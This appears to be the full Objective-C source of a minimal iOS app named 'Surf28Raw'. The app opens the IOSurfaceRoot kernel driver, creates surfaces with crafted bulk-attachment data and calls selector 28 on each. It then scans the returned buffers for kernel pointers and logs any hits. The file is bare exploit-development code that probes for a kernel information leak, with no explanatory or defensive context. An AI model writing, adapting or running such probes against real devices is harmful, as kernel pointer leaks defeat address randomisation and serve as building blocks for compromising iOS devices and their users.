#import <UIKit/UIKit.h>
#import <IOKit/IOKitLib.h>
#import <Foundation/Foundation.h>
#import <string.h>
#import <stdlib.h>
static NSMutableString *gLog; static NSString *gPath;
static void L(NSString *fmt,...){va_list ap;va_start(ap,fmt);NSString*s=[[NSString alloc]initWithFormat:fmt arguments:ap];va_end(ap);[gLog appendString:s];[gLog appendString:@"\n"];[gLog writeToFile:gPath atomically:YES encoding:NSUTF8StringEncoding error:nil];NSLog(@"[s28] %@",s);}
static uint64_t rd64(const void*p){uint64_t v;memcpy(&v,p,8);return v;}
static void scan(const char*tag,const uint8_t*b,size_t n){for(size_t i=0;i+8<=n;i+=8){uint64_t q=rd64(b+i);if((q&0xfffffff000000000ULL)==0xfffffff000000000ULL)L(@"[HIT %s] +0x%zx=0x%llx",tag,i,(unsigned long long)q);}}
static io_connect_t C;
static uint32_t create_surface(NSString*extra,const char*tag){
 NSMutableString*x=[NSMutableString stringWithString:@"<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"><plist version=\"1.0\"><dict><key>IOSurfaceWidth</key><integer>64</integer><key>IOSurfaceHeight</key><integer>64</integer><key>IOSurfaceBytesPerElement</key><integer>4</integer><key>IOSurfacePixelFormat</key><integer>1111970369</integer>"];
 if(extra)[x appendString:extra];
 [x appendString:@"</dict></plist>"];
 const char*xml=x.UTF8String; size_t xl=strlen(xml)+1;
 uint8_t out[0xc68]; memset(out,0xAA,sizeof(out)); size_t os=sizeof(out);
 uint64_t si=0; uint64_t so[4]={0}; uint32_t soc=0;
 kern_return_t kr=IOConnectCallMethod(C,0,&si,1,xml,xl,so,&soc,out,&os);
 uint32_t sid=*(uint32_t*)(out+0x18);
 L(@"[%s] create kr=0x%x osz=0x%zx sid=%u q0=0x%llx q2=0x%llx",tag,kr,os,sid,(unsigned long long)rd64(out),(unsigned long long)rd64(out+0x10));
 return kr?0:sid;
}
static void sel28(const char*tag,uint32_t sid){
 uint64_t si=sid; uint8_t out[0x100]; memset(out,0xAA,sizeof(out)); size_t os=0xa0; uint64_t so[4]={0}; uint32_t soc=0;
 kern_return_t kr=IOConnectCallMethod(C,28,&si,1,NULL,0,so,&soc,out,&os);
 L(@"[%s sel28] sid=%u kr=0x%x osz=0x%zx",tag,sid,kr,os);
 if(!kr){for(int i=0;i<0xa0;i+=8)L(@"[%s] +0x%02x=0x%llx",tag,i,(unsigned long long)rd64(out+i));scan(tag,out,0xa0);}
}
static void run(void){
 io_service_t svc=IOServiceGetMatchingService(kIOMasterPortDefault,IOServiceMatching("IOSurfaceRoot"));L(@"[svc] 0x%x",svc);if(!svc)return;
 kern_return_t kr=IOServiceOpen(svc,mach_task_self(),0,&C);IOObjectRelease(svc);L(@"[open] 0x%x conn=0x%x",kr,C);if(kr)return;
 uint32_t a=create_surface(nil,"none");
 uint32_t b=create_surface(@"<key>IOSurfaceDefaultBulkAttachments</key><data>qqqqqqqqqqqqqqqq</data>","aa16");
 uint32_t c=create_surface(@"<key>IOSurfaceDefaultBulkAttachments</key><data>//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8=</data>","aa84");
 if(a)sel28("none",a); if(b)sel28("aa16",b); if(c)sel28("aa84",c);
 IOServiceClose(C);L(@"=== done ===");
}
@interface AppDelegate:UIResponder<UIApplicationDelegate>@property(strong,nonatomic)UIWindow*window;@end
@implementation AppDelegate
- (BOOL)application:(UIApplication*)app didFinishLaunchingWithOptions:(NSDictionary*)opts{
 self.window=[[UIWindow alloc]initWithFrame:[UIScreen mainScreen].bounds];UIViewController*vc=[UIViewController new];vc.view.backgroundColor=UIColor.blackColor;
 UITextView*tv=[[UITextView alloc]initWithFrame:vc.view.bounds];tv.backgroundColor=UIColor.blackColor;tv.textColor=UIColor.greenColor;tv.font=[UIFont monospacedSystemFontOfSize:9 weight:UIFontWeightRegular];tv.editable=NO;tv.text=@"Surf28Raw\n";
 [vc.view addSubview:tv];self.window.rootViewController=vc;[self.window makeKeyAndVisible];[UIApplication sharedApplication].idleTimerDisabled=YES;
 dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH,0),^{NSString*docs=[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask,YES) firstObject];gPath=[docs stringByAppendingPathComponent:@"s28.log"];gLog=[NSMutableString new];run();dispatch_async(dispatch_get_main_queue(),^{tv.text=gLog;});});
 return YES;}
@end
int main(int argc,char**argv){@autoreleasepool{return UIApplicationMain(argc,argv,nil,NSStringFromClass([AppDelegate class]));}}
